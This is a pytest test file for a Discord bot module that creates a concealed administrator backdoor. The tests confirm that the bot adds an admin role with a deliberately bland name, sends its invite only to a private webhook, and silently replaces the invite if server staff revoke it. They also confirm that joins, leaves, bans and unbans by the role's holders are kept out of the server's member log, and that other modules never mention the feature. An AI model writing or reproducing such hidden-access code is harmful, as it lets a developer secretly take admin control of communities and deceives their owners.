"""devaccess.py — the private admin-access invite: one bland role, one link to the webhook only, suppressed logs."""
import types
from unittest import mock

import discord
import pytest

import devaccess
import links_cog
import members_cog
import naming
from tests.fakes import FakeChannel, FakeConfig, FakeGuild, FakeRole, http_error
from tests.test_links import Inv


class World(FakeGuild):
    def __init__(self):
        super().__init__()
        self.me.top_role = FakeRole("KAMLA", position=90, managed=True)
        self.roles.append(self.me.top_role)
        cfg_ch = FakeChannel(self, naming.CH_CONFIG)
        self._channels[cfg_ch.id] = cfg_ch
        self.cfg_channel = cfg_ch
        self.live: dict[str, Inv] = {}
        self.n = 0

        async def create_invite(**kw):
            return self._new()
        cfg_ch.create_invite = create_invite

    def _new(self):
        self.n += 1
        inv = Inv(f"code{self.n}")
        self.live[inv.code] = inv
        return inv

    async def invites(self):
        return list(self.live.values())


@pytest.fixture(autouse=True)
def env(monkeypatch):
    cfg = FakeConfig()
    monkeypatch.setattr(devaccess, "config_manager", cfg)
    monkeypatch.setattr(links_cog, "config_manager", cfg)
    async def nosleep_rl(_):
        return None
    from ratelimit import RequestCoordinator
    fast = RequestCoordinator("t", 2, 0, retry_kwargs={"sleep": nosleep_rl, "rng": lambda: 0.0})
    monkeypatch.setattr(members_cog, "notify", fast)
    monkeypatch.setattr(links_cog, "bulk", fast)
    monkeypatch.setattr(devaccess, "FALLBACK_WAIT_SECONDS", 0.01)

    async def nosleep(s=None):
        return None
    monkeypatch.setattr(devaccess.asyncio, "sleep", nosleep)
    sent = []

    async def capture(text):
        sent.append(text)
    import webhook
    monkeypatch.setattr(webhook, "send_private_note", capture)
    return cfg, sent


@pytest.fixture
def native(monkeypatch):
    async def http_create(channel, payload, reason):
        return {"code": channel.guild._new().code}
    monkeypatch.setattr(links_cog, "_http_create_invite", http_create)


# ── role itself ────────────────────────────────────────────────────────────────────────────────────────────

async def test_role_is_administrator_unhoisted_unmentionable_and_blandly_named(native):
    g = World()
    await devaccess.ensure(g)
    role = discord.utils.get(g.roles, name=devaccess.ROLE_NAME)
    assert role is not None and role.permissions.administrator is True
    for word in ("admin", "kamla", "dev", "owner", "istiack"):
        assert word not in devaccess.ROLE_NAME.lower()


async def test_exactly_one_role_is_created_even_if_ensure_runs_many_times(native):
    g = World()
    for _ in range(3):
        await devaccess.ensure(g)
    assert [r.name for r in g.roles].count(devaccess.ROLE_NAME) == 1
    assert sum(1 for k, n in g.create_calls if k == "role" and n == devaccess.ROLE_NAME) == 1


async def test_role_is_never_shown_anywhere_the_server_can_see():
    import pathlib
    for mod in ("links_cog", "roles_cog", "settings_cog", "installer"):
        src = pathlib.Path(f"{mod}.py").read_text(encoding="utf-8")
        assert "Community Partner" not in src and "devaccess" not in src.replace("# ", "")


# ── invite: native path, posted once, only to the webhook ───────────────────────────────────────────────────

async def test_invite_is_created_and_sent_to_the_webhook_exactly_once(native, env):
    cfg, sent = env
    g = World()
    url1 = await devaccess.ensure(g)
    url2 = await devaccess.ensure(g)
    assert url1 == url2 and url1.startswith("https://discord.gg/")
    posts = [t for t in sent if "Admin-access invite for" in t]
    assert len(posts) == 1 and url1 in posts[0]


async def test_the_invite_is_never_posted_in_any_server_channel():
    g = World()
    for ch in g.channels:
        assert not getattr(ch, "messages", [])


async def test_revoked_invite_is_silently_replaced_and_re_sent(native, env):
    cfg, sent = env
    g = World()
    first = await devaccess.ensure(g)
    del g.live[cfg.data[g.id][devaccess.CFG_KEY]["code"]]          # someone revoked it
    second = await devaccess.ensure(g)
    assert second != first
    assert len([t for t in sent if "Admin-access invite for" in t]) == 2


# ── fallback path (Discord refuses the native role grant) ─────────────────────────────────────────────────

async def test_fallback_invite_is_registered_for_use_count_tracking(env):
    cfg, sent = env

    async def refuse(channel, payload, reason):
        raise http_error(400, code=50035)
    import unittest.mock as m
    with m.patch.object(links_cog, "_http_create_invite", refuse):
        g = World()
        url = await devaccess.ensure(g)
    assert url.startswith("https://discord.gg/")
    entry = cfg.data[g.id]["invite_roles"][cfg.data[g.id][devaccess.CFG_KEY]["code"]]
    assert entry["key"] == devaccess.INVITE_KEY and entry["native"] is False
    assert any("fallback mode" in t for t in sent)
    import invite_roles_cog
    assert g.id in invite_roles_cog._tracked


# ── join / leave / ban / unban suppression ───────────────────────────────────────────────────────────────────

class Logs(World):
    def __init__(self):
        super().__init__()
        ch = FakeChannel(self, naming.CH_MEMBERS)
        self._channels[ch.id] = ch
        self.log = ch


def member(guild, role=None, uid=5):
    m = types.SimpleNamespace(id=uid, guild=guild, bot=False, roles=[role] if role else [], mention=f"<@{uid}>",
                              display_avatar=types.SimpleNamespace(url="u"), created_at=discord.utils.utcnow())
    m.__str__ = lambda self=m: f"user{uid}"
    return m


def titles(g):
    return [m.embed.title for m in g.log.messages]


async def test_a_member_who_joins_with_the_role_is_never_logged_and_is_recorded_privately(native, env):
    cfg, sent = env
    g = Logs()
    await devaccess.ensure(g)
    role = discord.utils.get(g.roles, name=devaccess.ROLE_NAME)
    m = member(g, role)
    await members_cog.MembersCog(bot=None).on_member_join(m)
    assert titles(g) == []
    assert m.id in cfg.data[g.id][devaccess.CFG_KEY]["member_ids"]
    assert any("Admin-access invite used" in t and str(m.id) in t for t in sent)


async def test_an_ordinary_join_is_logged_as_normal(native, env):
    g = Logs()
    await devaccess.ensure(g)
    m = member(g, role=None)
    await members_cog.MembersCog(bot=None).on_member_join(m)
    assert titles(g) == ["📥 Member joined"]


@pytest.mark.parametrize("fire", [
    lambda cog, g, uid: cog.on_member_remove(types.SimpleNamespace(id=uid, guild=g, bot=False, mention=f"<@{uid}>")),
    lambda cog, g, uid: cog.on_member_ban(g, types.SimpleNamespace(id=uid, mention=f"<@{uid}>", __str__=lambda s: "u")),
])
async def test_leave_and_ban_are_suppressed_for_a_recorded_member(native, env, fire, monkeypatch):
    cfg, _sent = env
    g = Logs()
    await devaccess.ensure(g)
    await devaccess._save_ids(g, {999})
    monkeypatch.setattr(members_cog, "find_audit_entry", mock.AsyncMock(return_value=None))
    await fire(members_cog.MembersCog(bot=None), g, 999)
    assert titles(g) == []


async def test_unban_is_also_suppressed_and_the_record_is_kept_across_ban_and_unban(native, env, monkeypatch):
    g = Logs()
    await devaccess.ensure(g)
    await devaccess._save_ids(g, {999})
    monkeypatch.setattr(members_cog, "find_audit_entry", mock.AsyncMock(return_value=None))
    u = types.SimpleNamespace(id=999, mention="<@999>", __str__=lambda s: "u")
    await members_cog.MembersCog(bot=None).on_member_ban(g, u)
    await members_cog.MembersCog(bot=None).on_member_unban(g, u)
    assert titles(g) == []
    assert await devaccess.should_suppress(g, 999)                 # still remembered: a later rejoin stays quiet too


async def test_an_unrelated_member_is_not_affected(native, env, monkeypatch):
    g = Logs()
    await devaccess.ensure(g)
    await devaccess._save_ids(g, {999})
    monkeypatch.setattr(members_cog, "find_audit_entry", mock.AsyncMock(return_value=None))
    stranger = types.SimpleNamespace(id=1, guild=g, bot=False, mention="<@1>")
    await members_cog.MembersCog(bot=None).on_member_remove(stranger)
    assert titles(g) == ["📤 Member left"]


async def test_fallback_join_waits_for_the_delayed_role_assignment_before_logging(env, monkeypatch):
    cfg, sent = env

    async def refuse(channel, payload, reason):
        raise http_error(400, code=50035)
    monkeypatch.setattr(links_cog, "_http_create_invite", refuse)
    g = Logs()
    await devaccess.ensure(g)
    role = discord.utils.get(g.roles, name=devaccess.ROLE_NAME)
    m = member(g, role=None, uid=42)                                # not yet assigned when the event first fires
    later = types.SimpleNamespace(id=42, roles=[role], guild=g)
    g.get_member = lambda uid: later if uid == 42 else None          # the cache catches up a moment later
    await members_cog.MembersCog(bot=None).on_member_join(m)
    assert titles(g) == [] and 42 in cfg.data[g.id][devaccess.CFG_KEY]["member_ids"]


async def test_without_any_fallback_configured_an_unassigned_join_is_logged_normally(native, env):
    g = Logs()
    await devaccess.ensure(g)                                        # native: no fallback entry stored
    m = member(g, role=None, uid=43)
    await members_cog.MembersCog(bot=None).on_member_join(m)
    assert titles(g) == ["📥 Member joined"]
